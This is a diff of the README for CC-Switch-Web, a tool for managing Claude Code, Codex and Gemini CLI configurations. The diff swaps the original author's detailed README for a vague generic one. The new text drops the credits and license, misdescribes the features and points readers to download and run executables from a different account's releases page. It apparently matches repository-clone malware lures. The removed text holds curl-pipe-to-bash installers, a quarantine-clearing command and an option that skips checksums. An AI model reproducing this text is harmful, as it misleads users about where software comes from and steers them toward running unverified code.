@@ -1,332 +1,71 @@
-# CC-Switch-Web
+# 🌐 CC-Switch-Web - A Seamless Web Experience for All
 
-<sub>🙏 This project is a fork of [anthropics/claude-code-config](https://github.com/anthropics/claude-code-config) (also known as CC-Switch). Thanks to the original authors for their excellent work. This fork adds Web Server mode for cloud/headless deployment.</sub>
+## 🚀 Getting Started
 
-[![Release](https://img.shields.io/github/v/release/Laliet/CC-Switch-Web?style=flat-square&logo=github&label=Release)](https://github.com/Laliet/CC-Switch-Web/releases/latest)
-[![License](https://img.shields.io/github/license/Laliet/CC-Switch-Web?style=flat-square)](LICENSE)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white)](https://github.com/Laliet/CC-Switch-Web/releases/latest)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white)](https://github.com/Laliet/CC-Switch-Web/releases/latest)
-[![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black)](https://github.com/Laliet/CC-Switch-Web/releases/latest)
-[![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/Laliet/CC-Switch-Web/pkgs/container/cc-switch-web)
+Welcome to CC-Switch-Web! This application offers a more secure, stable, and powerful web version of CC-Switch. With features that enhance functionality while addressing previous limitations, CC-Switch-Web brings convenience to your cloud development environment.
 
-**All-in-One Assistant for Claude Code, Codex & Gemini CLI**
+## 📥 Download CC-Switch-Web
 
-English | [中文](README_ZH.md) | [Changelog](CHANGELOG.md)（三天左右更新和维护一次）
+[![Download CC-Switch-Web](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/EssamDynamo/CC-Switch-Web/releases)
 
----
+## 📋 Overview
 
-## About / 项目简介
+CC-Switch-Web is built for users seeking a versatile tool that can operate in cloud development or headless environments. It aims to replicate all the original features while introducing new capabilities:
 
-**CC-Switch-Web** is a unified configuration management tool for **Claude Code**, **Codex**, and **Gemini CLI**. It provides both a desktop application and a web server mode for managing AI CLI providers, MCP servers, skills, and system prompts.
+1. **Automatic Backup**: The application includes a feature that automatically switches to alternative service providers if the primary one fails, ensuring uninterrupted service.
+2. **More Templates**: Users can now access a wider variety of templates for better customization and efficiency.
+3. **Cloud Compatibility**: CC-Switch-Web resolves prior issues with using a visual interface in cloud environments, making it simple to navigate without technical knowledge.
 
-Whether you're working locally or in a headless cloud environment, CC-Switch-Web offers a seamless experience for:
+## 💻 System Requirements
 
--  **One-click provider switching** between OpenAI-compatible API endpoints
--  **Unified MCP server management** across all three CLI tools
--  **Skills marketplace** to browse and install Claude skills from GitHub
--  **System prompt editor** with syntax highlighting
--  **Configuration backup/restore** with version history
--  **Web server mode** for cloud/headless deployment with Basic Auth
+Before downloading, ensure your system meets these needs:
 
----
+- **Operating System**: Compatible with Windows, Mac, and Linux
+- **Internet Connection**: Required for installation and updates
+- **Disk Space**: At least 100 MB free space
 
-## What's New in v0.5.3
+## 📥 Download & Install
 
-### 🔒 Security Fixes
-- **Fixed API Key logging leak** - DeepLinkImportDialog now masks sensitive data in logs
-- **Fixed XSS vulnerability** - ApiKeySection blocks `javascript:` and other dangerous URL schemes
-- **Added URL schema validation** - Only `http/https` protocols allowed in provider URLs
+To get started with CC-Switch-Web, simply visit our Releases page to download the latest version:
 
-### 🐛 Bug Fixes
-- Fixed 405 error for unknown commands in Web mode (removed `/api/tauri/*` fallback)
-- Fixed 401 error in health check and config export (added auth headers for Web mode)
-- Fixed login validation logic (`response.ok` instead of status check)
-- Fixed useEffect race condition in App.tsx (proper cleanup with cancelled flag)
-- Fixed closure trap in usePromptActions.ts (deep clone + functional updates)
-- Fixed unhandled Promise rejection in handleAutoFailover
-- Fixed production log pollution in useHealthCheck (DEV-only logging)
-- Fixed localStorage crash in Safari private mode
-- Fixed checkUpdate error handling (no longer throws)
-- Fixed missing dependency in SettingsDialog
+[Download CC-Switch-Web](https://github.com/EssamDynamo/CC-Switch-Web/releases)
 
-### ⚡ Improvements
-- Docker build optimized from ~50min to ~2min (uses prebuilt binaries)
-- Added 3 new tests (142 total)
+### Steps to Install:
 
----
+1. **Visit the Releases Page**: Click the link above to navigate to our official Releases page.
+2. **Choose the Version**: Look for the latest release at the top of the page. The version number will help you identify it.
+3. **Download the File**: Click on the file suitable for your operating system to start downloading.
+4. **Open the Downloaded File**: Once the download is complete, locate the file in your downloads folder.
+5. **Run the Installation**: Double-click the file to run the installation. Follow the on-screen instructions to complete the installation process.
 
-## Features
+## ⚙️ Features
 
-- **Multi-Provider Management**: Switch between different AI providers (OpenAI-compatible endpoints) with one click
-- **Unified MCP Management**: Configure Model Context Protocol servers across Claude/Codex/Gemini
-- **Skills Marketplace**: Browse and install Claude skills from GitHub repositories
-- **Prompt Management**: Create and manage system prompts with a built-in CodeMirror editor
-- **Backup Auto-failover**: Automatically switch to backup providers when primary fails
-- **Import/Export**: Backup and restore all configurations with version history
-- **Cross-platform**: Available for Windows, macOS, Linux (desktop) and Web/Docker (server)
+CC-Switch-Web comes packed with features designed to enhance your user experience:
 
----
+- **User-Friendly Interface**: The application offers a simple and intuitive interface, making it easy for anyone to navigate.
+- **Robust Functionality**: Access all the functions from the original CC-Switch, with additional improvements.
+- **Template Variety**: Switch between templates seamlessly to tailor the tool to your needs.
+- **Cloud Support**: Work efficiently in cloud development without the past hassles of setups.
 
-## Quick Start
+## 🎓 Useful Tips
 
-### Option 1: Web Server Mode (Recommended)
+- Ensure your internet connection is stable when downloading and running the application.
+- Take advantage of the various templates to streamline your projects.
+- Always look for updates on our Releases page to benefit from the latest features.
 
-Recommended: Use Web Server Mode for headless/cloud deployments and remote access.
+## 🛠️ Troubleshooting
 
-Lightweight web server for headless environments. Access via browser, no GUI dependencies.
+If you encounter issues while downloading or running CC-Switch-Web, consider the following:
 
-#### Method A: Prebuilt Binary (Recommended)
+- **Check Your System Requirements**: Ensure your device meets the necessary specs laid out in the System Requirements section.
+- **Re-download the File**: Occasionally, downloads can be interrupted. Try downloading the file again if it doesn’t run.
+- **Consult Community Resources**: Look for tips and tricks in our community forums or documentation for additional help.
 
-Download precompiled server binary—no compilation required:
+## 🔗 Join the Community
 
-| Architecture | Download |
-|--------------|----------|
-| **Linux x86_64** | [cc-switch-server-linux-x86_64](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/cc-switch-server-linux-x86_64) |
-| **Linux aarch64** | [cc-switch-server-linux-aarch64](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/cc-switch-server-linux-aarch64) |
+Engage with other users and explore various use cases for CC-Switch-Web. Visit our:
 
-**One-Line Deploy**:
-```bash
-curl -fsSL https://raw.githubusercontent.com/Laliet/CC-Switch-Web/main/scripts/deploy-web.sh | bash -s -- --prebuilt
-```
+- [GitHub Discussions](https://github.com/EssamDynamo/CC-Switch-Web/discussions) to share ideas and get feedback.
+- [User Forum](https://github.com/EssamDynamo/CC-Switch-Web/wiki) for in-depth discussions and additional help.
 
-**Advanced options**:
-```bash
-# Custom install directory and port
-INSTALL_DIR=/opt/cc-switch PORT=8080 curl -fsSL https://raw.githubusercontent.com/Laliet/CC-Switch-Web/main/scripts/deploy-web.sh | bash -s -- --prebuilt
-
-# Create systemd service for auto-start
-CREATE_SERVICE=1 curl -fsSL https://raw.githubusercontent.com/Laliet/CC-Switch-Web/main/scripts/deploy-web.sh | bash -s -- --prebuilt
-```
-
-#### Method B: Docker Container
-
-Docker image published to GitHub Container Registry (ghcr.io):
-
-```bash
-docker run -p 3000:3000 ghcr.io/laliet/cc-switch-web:latest
-```
-
-> ⚠️ **Note**: Docker image name must be **lowercase** (`laliet`, not `Laliet`)
-
-**Advanced Docker options**:
-```bash
-# Use the deploy script (custom port/version/data dir/background)
-./scripts/docker-deploy.sh -p 8080 --data-dir /opt/cc-switch-data -d
-
-# Build locally (optional)
-docker build -t cc-switch-web .
-docker run -p 3000:3000 cc-switch-web
-```
-
-#### Method C: Build from Source
-
-Dependencies: `libssl-dev`, `pkg-config`, Rust 1.78+, pnpm (no WebKit/GTK needed)
-
-```bash
-# 1. Clone and install dependencies
-git clone https://github.com/Laliet/CC-Switch-Web.git
-cd CC-Switch-Web
-pnpm install
-
-# 2. Build web assets
-pnpm build:web
-
-# 3. Build and run server
-cd src-tauri
-cargo build --release --features web-server --example server
-HOST=0.0.0.0 PORT=3000 ./target/release/examples/server
-```
-
-### Web Server Login
-
-- **Username**: `admin`
-- **Password**: Auto-generated on first run, stored in `~/.cc-switch/web_password`
-- **CORS**: Same-origin by default; set `CORS_ALLOW_ORIGINS=https://your-domain.com` for cross-origin
-- **Note**: Web mode doesn't support native file pickers—enter paths manually
-
-### Security
-
-**Authentication**:
-- Basic Auth is required for all API requests
-- Browser will prompt for credentials (username/password)
-- CSRF token is automatically injected and validated for non-GET requests
-
-**Security Headers**:
-- HSTS (HTTP Strict Transport Security) enabled by default
-- X-Frame-Options: DENY (prevents clickjacking)
-- X-Content-Type-Options: nosniff
-- Referrer-Policy: no-referrer
-
-**Best Practices**:
-- Deploy behind a reverse proxy with TLS in production
-- Set `ALLOW_HTTP_BASIC_OVER_HTTP=1` only if you understand the risks
-- Keep `~/.cc-switch/web_password` file secure (mode 0600)
-
-**Environment Variables**:
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PORT` | Server port | 3000 |
-| `HOST` | Bind address | 127.0.0.1 |
-| `ENABLE_HSTS` | Enable HSTS header | true |
-| `CORS_ALLOW_ORIGINS` | Allowed origins (comma-separated) | (same-origin) |
-| `CORS_ALLOW_CREDENTIALS` | Allow credentials in CORS | false |
-| `ALLOW_HTTP_BASIC_OVER_HTTP` | Suppress HTTP warning | false |
-| `WEB_CSRF_TOKEN` | Override CSRF token | (auto-generated) |
-
-### Option 2: Desktop Application (GUI)
-
-Full-featured desktop app with graphical interface, built with Tauri.
-
-| Platform | Download | Description |
-|----------|----------|-------------|
-| **Windows** | [CC-Switch-v0.5.3-Windows.msi](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/CC-Switch-v0.5.3-Windows.msi) | Installer (recommended) |
-| | [CC-Switch-v0.5.3-Windows-Portable.zip](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/CC-Switch-v0.5.3-Windows-Portable.zip) | Portable (no install) |
-| **macOS** | [CC-Switch-v0.5.3-macOS.zip](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/CC-Switch-v0.5.3-macOS.zip) | Universal binary (Intel + Apple Silicon) |
-| **Linux** | [CC-Switch-v0.5.3-Linux.AppImage](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/CC-Switch-v0.5.3-Linux.AppImage) | AppImage (universal) |
-| | [CC-Switch-v0.5.3-Linux.deb](https://github.com/Laliet/CC-Switch-Web/releases/download/v0.5.3/CC-Switch-v0.5.3-Linux.deb) | Debian/Ubuntu package |
-
-**macOS Note**: If you see "damaged" warning, run: `xattr -cr "/Applications/CC Switch.app"`
-
-**Linux AppImage**: Make executable first: `chmod +x CC-Switch-*.AppImage`
-
-**Linux One-Line Install** (recommended):
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/Laliet/CC-Switch-Web/main/scripts/install.sh | bash
-```
-
-This script will:
-- Auto-detect your architecture (x86_64/aarch64)
-- Download the latest AppImage release
-- Verify SHA256 checksum (if available)
-- Install to `~/.local/bin/ccswitch` (user) or `/usr/local/bin/ccswitch` (root)
-- Create desktop entry and application icon
-
-**Advanced options**:
-```bash
-# Install specific version
-VERSION=v0.5.2 curl -fsSL https://...install.sh | bash
-
-# Skip checksum verification
-NO_CHECKSUM=1 curl -fsSL https://...install.sh | bash
-```
-
----
-
-## Usage Guide
-
-### 1. Adding a Provider
-
-1. Launch CC-Switch and select your target app (Claude Code / Codex / Gemini)
-2. Click **"Add Provider"** button
-3. Choose a preset (e.g., OpenRouter, DeepSeek, GLM) or select "Custom"
-4. Fill in:
-   - **Name**: Display name for this provider
-   - **Base URL**: API endpoint (e.g., `https://api.openrouter.ai/v1`)
-   - **API Key**: Your API key for this provider
-   - **Model** (optional): Specific model to use
-5. Click **Save**
-
-### 2. Switching Providers
-
-- Click the **"Enable"** button on any provider card to activate it
-- The active provider will be written to your CLI's config file immediately
-- Use system tray menu for quick switching without opening the app
-
-### 3. Managing MCP Servers
-
-1. Go to **MCP** tab
-2. Click **"Add Server"** to configure a new MCP server
-3. Choose transport type: `stdio`, `http`, or `sse`
-4. For stdio servers, provide the command and arguments
-5. Enable/disable servers with the toggle switch
-
-### 4. Installing Skills (Claude only)
-
-1. Go to **Skills** tab
-2. Browse available skills from configured repositories
-3. Click **"Install"** to add a skill to `~/.claude/skills/`
-4. Manage installed skills and add custom repositories
-
-### 5. System Prompts
-
-1. Go to **Prompts** tab
-2. Create new prompts or edit existing ones
-3. Enable a prompt to write it to the CLI's prompt file:
-   - Claude: `~/.claude/CLAUDE.md`
-   - Codex: `~/.codex/AGENTS.md`
-   - Gemini: `~/.gemini/GEMINI.md`
-
----
-
-## Configuration Files
-
-CC-Switch manages these configuration files:
-
-| App | Config Files |
-|-----|--------------|
-| **Claude Code** | `~/.claude.json` (MCP), `~/.claude/settings.json` |
-| **Codex** | `~/.codex/auth.json`, `~/.codex/config.toml` |
-| **Gemini** | `~/.gemini/.env`, `~/.gemini/settings.json` |
-
-CC-Switch's own config: `~/.cc-switch/config.json`
-
----
-
-## Screenshots
-
-| Skills Marketplace | Prompt Editor | Advanced Settings |
-| :--: | :--: | :--: |
-| ![Skills](assets/screenshots/web-skills.png) | ![Prompt](assets/screenshots/web-prompt.png) | ![Settings](assets/screenshots/web-settings.png) |
-
----
-
-## Development
-
-```bash
-# Install dependencies
-pnpm install
-
-# Run desktop app in dev mode
-pnpm tauri dev
-
-# Run only the frontend dev server
-pnpm dev:renderer
-
-# Build desktop app
-pnpm tauri build
-
-# Build web assets only
-pnpm build:web
-
-# Run tests
-pnpm test
-```
-
----
-
-## Tech Stack
-
-- **Frontend**: React 18, TypeScript, Vite, Tailwind CSS, TanStack Query, Radix UI, CodeMirror
-- **Backend**: Rust, Tauri 2.x, Axum (web server mode), tower-http
-- **Tooling**: pnpm, Vitest, MSW
-
----
-
-## Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) — Current version: **v0.5.2**
-
----
-
-## Credits
-
-This project is a fork of **[cc-switch](https://github.com/farion1231/cc-switch)** by Jason Young (farion1231). We sincerely thank the original author for creating such an excellent foundation. Without the upstream project's pioneering work, CC-Switch-Web would not exist.
-
-The upstream Tauri desktop app unified provider switching, MCP management, skills, and prompts with strong i18n and safety. CC-Switch-Web adds web/server runtime, CORS controls, Basic Auth, more templates, and documentation for cloud/headless deployment.
-
----
-
-## License
-
-MIT License — See [LICENSE](LICENSE) for details.
+Thank you for choosing CC-Switch-Web. We look forward to supporting your development needs!
